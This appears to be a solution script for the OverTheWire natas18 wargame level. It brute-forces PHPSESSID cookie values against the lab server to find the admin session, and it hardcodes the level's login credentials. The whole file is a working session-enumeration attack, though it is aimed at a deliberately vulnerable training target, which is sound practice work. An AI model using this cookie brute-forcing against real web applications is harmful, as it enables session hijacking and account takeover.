#!/usr/bin/env python
import requests

url = "http://natas18.natas.labs.overthewire.org"
authUsername = "natas18"
authPassword = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"

wrong = "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19."

for i in range(0, 640):

	cookie = {"PHPSESSID": str(i)}
	print "[#] Current cookie: {0}".format(i)
	r = requests.get(url, cookies=cookie, auth=(authUsername, authPassword))

	if wrong not in r.text:
		print "[#] The admin PHPSESSID is {0}".format(i)
		break